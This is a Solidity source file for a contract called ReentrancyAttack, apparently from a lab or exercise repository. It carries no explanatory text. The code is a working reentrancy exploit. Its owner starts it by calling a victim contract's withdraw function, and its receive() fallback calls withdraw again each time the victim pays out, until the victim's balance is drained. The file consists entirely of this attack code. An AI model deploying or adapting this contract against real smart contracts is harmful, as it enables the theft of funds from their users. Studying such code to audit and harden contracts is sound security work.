// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IReentrancy {
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttack is Ownable {
    address public victimAddress;

    uint256 public immutable depositAmount;

    constructor(address addr, uint256 amount) {
        victimAddress = addr;
        depositAmount = amount;
    }

    receive() external payable {
        if (msg.sender != victimAddress) revert();

        _attack();
    }

    function startAttack() external onlyOwner {
        _attack();
    }

    function _attack() private {
        if (victimAddress.balance > 0) {
            IReentrancy(victimAddress).withdraw(depositAmount);
        }
    }
}
